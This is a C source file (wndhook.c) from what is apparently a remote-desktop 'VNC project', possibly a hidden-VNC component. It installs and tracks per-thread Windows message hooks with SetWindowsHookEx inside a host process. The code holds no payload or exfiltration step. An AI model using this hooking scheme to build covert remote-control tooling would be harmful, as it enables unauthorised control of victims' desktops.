//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: wndhook.c
// $Revision: 166 $
// $Date: 2014-02-14 19:47:48 +0400 (Пт, 14 фев 2014) $
// description: 
//	windows hook.

#include "vncmain.h"
#include "wndhook.h"
#include "vncsrv.h"
#include "vncwnd.h"

static	LIST_ENTRY			g_ThreadListHead = {0};		// Global threads list head
static	CRITICAL_SECTION	g_ThreadListLock = {0};		// Global threads list lock

//
//	Allocates and initialize WND_THREAD structure.
//
static WINERROR WndHookThreadInit(
	ULONG			ThreadId,
	PWND_THREAD*	ppWndThread
	)
{
	WINERROR Status = NO_ERROR;
	PWND_THREAD	pWndThread;

	if (pWndThread = (PWND_THREAD)hAlloc(sizeof(WND_THREAD)))
	{
#if _DEBUG
		pWndThread->Magic = WND_THREAD_MAGIC;
#endif
		InitializeListHead(&pWndThread->Entry);
		pWndThread->ThreadId = ThreadId;
		*ppWndThread = pWndThread;
	}
	else
		Status = ERROR_NOT_ENOUGH_MEMORY;

	return(Status);
}


//
//	Releases WND_THREAD structure.
//
static VOID WndHookThreadRelease(
	PWND_THREAD	pWndThread
	)
{
	ASSERT_WND_THREAD(pWndThread);
#if	_DEBUG
	pWndThread->Magic = 0;
#endif
	hFree(pWndThread);
}


//
//	Called whenever a new thread is being attached to the current process.
//	Allocates a WND_THREAD structure for this thread. Sets a hook routine for the thread.
//	Links the WND_THREAD structure into the global threads list.
//
WINERROR WndHookOnThreadAttach(
	ULONG ThreadId
	)
{
	WINERROR	Status;
	PLIST_ENTRY	pEntry;
	PWND_THREAD	pWndThread, pNextWndThread;
	BOOL Workaround = FALSE;

	if (((Status = WndHookThreadInit(ThreadId, &pWndThread)) == NO_ERROR) )
	{
		DWORD SystemVersion = GetVersion();
		CHAR SystemMajor = LOBYTE(LOWORD(SystemVersion));
		CHAR SystemMinor = HIBYTE(LOWORD(SystemVersion));

		if (SystemMajor > 6 || ( SystemMajor == 6 && SystemMinor > 1)){ // win8
			pWndThread->hHook = SetWindowsHookEx(WH_CALLWNDPROC, (HOOKPROC)VncSrvCallWndProc, NULL, ThreadId);
		}else{
			pWndThread->hHook = SetWindowsHookEx(WH_CBT, (HOOKPROC)VncSrvWndProc, NULL, ThreadId);
		}
		if (pWndThread->hHook)
		{
			// Inserting our new WND_THREAD into the global thread list
			EnterCriticalSection(&g_ThreadListLock);
			pEntry = g_ThreadListHead.Flink;

			while(pEntry != &g_ThreadListHead)
			{
				pNextWndThread = CONTAINING_RECORD(pEntry, WND_THREAD, Entry);
				//ASSERT(pNextWndThread->ThreadId != pWndThread->ThreadId);
				if ( pNextWndThread->ThreadId == pWndThread->ThreadId){
					pNextWndThread->hHook = pWndThread->hHook;
					Workaround = TRUE;
					break;
				}

				// Linking WND_THREADs by ThreadId in ascending order to simplify searching
				if (pNextWndThread->ThreadId > pWndThread->ThreadId)
					break;

				pEntry = pEntry->Flink;
			}	// while(pEntry != &g_ThreadListHead)

			if ( Workaround == FALSE ){
				InsertHeadList(pEntry, &pWndThread->Entry);
			}
			LeaveCriticalSection(&g_ThreadListLock);
			ASSERT(Status == NO_ERROR);
			if ( Workaround ){
				WndHookThreadRelease(pWndThread);
			}
		}	
		else
		{
			Status = GetLastError();
			DbgPrint("SetWindowsHookEx failed err=%lu\n",Status);
			WndHookThreadRelease(pWndThread);
		}
	}	// if ((Status = WndHookThreadInit(ThreadId)) == NO_ERROR)

	return(Status);
}


//
//	Called whenever a thread of the current process is being terminated.
//	Searches for a WND_THREAD structure for this thread, unlinks it from the global threads list,
//	 removes thread's hook routine if any, and releases WND_THREAD structure.
//
WINERROR WndHookOnThreadDetach(
	ULONG ThreadId
	)
{
	WINERROR	Status = NO_ERROR;
	PLIST_ENTRY	pEntry;
	PWND_THREAD	pWndThread = NULL;

	EnterCriticalSection(&g_ThreadListLock);
	pEntry = g_ThreadListHead.Flink;

	// Searching for the WND_THREAD record for the specified ThreadId
	while(pEntry != &g_ThreadListHead)
	{
		pWndThread = CONTAINING_RECORD(pEntry, WND_THREAD, Entry);

		if (pWndThread->ThreadId == ThreadId)
		{
			RemoveEntryList(&pWndThread->Entry);
			break;
		}

		if (pWndThread->ThreadId > ThreadId)
			break;

		pEntry = pEntry->Flink;
	}	// while(pEntry != &g_ThreadListHead)

	LeaveCriticalSection(&g_ThreadListLock);

	if (pWndThread && pWndThread->ThreadId == ThreadId)
	{
		// Target WND_THREAD found
		UnhookWindowsHookEx(pWndThread->hHook);
		WndHookThreadRelease(pWndThread);
		ASSERT(Status == NO_ERROR);
	}
	else
	{
		// A WND_THREAD structure for a thread with the specified ID was not found within the global threads list
		//ASSERT(FALSE);
		Status = ERROR_FILE_NOT_FOUND;
	}
	
	return(Status);
}

//
//	Called whenever need to hook the thread's message queue
//
WINERROR WndHookOnThreadHookAttach(
	ULONG ThreadId
	)
{
	WINERROR	Status;
	PLIST_ENTRY	pEntry;
	PWND_THREAD	pWndThread = NULL, pNextWndThread;

	EnterCriticalSection(&g_ThreadListLock);
	pEntry = g_ThreadListHead.Flink;

	while(pEntry != &g_ThreadListHead)
	{
		ULONG CurrentId;
		pWndThread = CONTAINING_RECORD(pEntry, WND_THREAD, Entry);
		
		CurrentId = pWndThread->ThreadId;
		if ( CurrentId == ThreadId){
			break;
		}

		pEntry = pEntry->Flink;
		pWndThread = NULL;

		if ( CurrentId > ThreadId){
			break;
		}

	}	// while(pEnt
	LeaveCriticalSection(&g_ThreadListLock);

	if ( pWndThread != NULL ){
		DbgPrint("already attached tid=%lu\n",ThreadId);
		return ERROR_ALREADY_EXISTS;
	}

	if (((Status = WndHookThreadInit(ThreadId, &pWndThread)) == NO_ERROR) )
	{
		DWORD SystemVersion = GetVersion();
		CHAR SystemMajor = LOBYTE(LOWORD(SystemVersion));
		CHAR SystemMinor = HIBYTE(LOWORD(SystemVersion));

		if (SystemMajor > 6 || ( SystemMajor == 6 && SystemMinor > 1)){ // win8
			pWndThread->hHook = SetWindowsHookEx(WH_CALLWNDPROC, (HOOKPROC)VncSrvCallWndProc, NULL, ThreadId);
		}else{
			pWndThread->hHook = SetWindowsHookEx(WH_CBT, (HOOKPROC)VncSrvWndProc, NULL, ThreadId);
		}
		if (pWndThread->hHook)
		{
			// Inserting our new WND_THREAD into the global thread list
			EnterCriticalSection(&g_ThreadListLock);
			pEntry = g_ThreadListHead.Flink;

			while(pEntry != &g_ThreadListHead)
			{
				pNextWndThread = CONTAINING_RECORD(pEntry, WND_THREAD, Entry);
				ASSERT(pNextWndThread->ThreadId != pWndThread->ThreadId);

				// Linking WND_THREADs by ThreadId in ascending order to simplify searching
				if (pNextWndThread->ThreadId > pWndThread->ThreadId)
					break;

				pEntry = pEntry->Flink;
			}	// while(pEntry != &g_ThreadListHead)

			InsertHeadList(pEntry, &pWndThread->Entry);
			LeaveCriticalSection(&g_ThreadListLock);
			ASSERT(Status == NO_ERROR);
		}	// if (pWndThread->hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)WndHookProc, NULL, ThreadId))
		else
		{
			Status = GetLastError();
			WndHookThreadRelease(pWndThread);
		}
	}	// if ((Status = WndHookThreadInit(ThreadId)) == NO_ERROR)

	return(Status);
}

// ---- Hook functions -----------------------------------------------------------------------------------------------------


// ---- Startup and cleanup routines ---------------------------------------------------------------------------------------

//
//	Startup function. Must be called first.
//
WINERROR WndHookStartup(VOID)
{
	WINERROR Status = NO_ERROR;

	InitializeListHead(&g_ThreadListHead);
	InitializeCriticalSection(&g_ThreadListLock);

	return(Status);
}

//
//	Cleanup function.
//
VOID WndHookCleanup(VOID)
{
	PLIST_ENTRY	pEntry;
	PWND_THREAD	pWndThread;

	if ( g_ThreadListHead.Flink && g_ThreadListHead.Blink )
	{

		// Cleaning up the global threads list
		EnterCriticalSection(&g_ThreadListLock);
		pEntry = g_ThreadListHead.Flink;

		while(pEntry != &g_ThreadListHead)
		{
			pWndThread = CONTAINING_RECORD(pEntry, WND_THREAD, Entry);
			pEntry = pEntry->Flink;

			RemoveEntryList(&pWndThread->Entry);
			UnhookWindowsHookEx(pWndThread->hHook);
			WndHookThreadRelease(pWndThread);
		}	// while(pEntry != &g_ThreadListHead)

		LeaveCriticalSection(&g_ThreadListLock);

		// Waiting for all hook-functions to complete
		WaitForHooks();

		DeleteCriticalSection(&g_ThreadListLock);
	}
}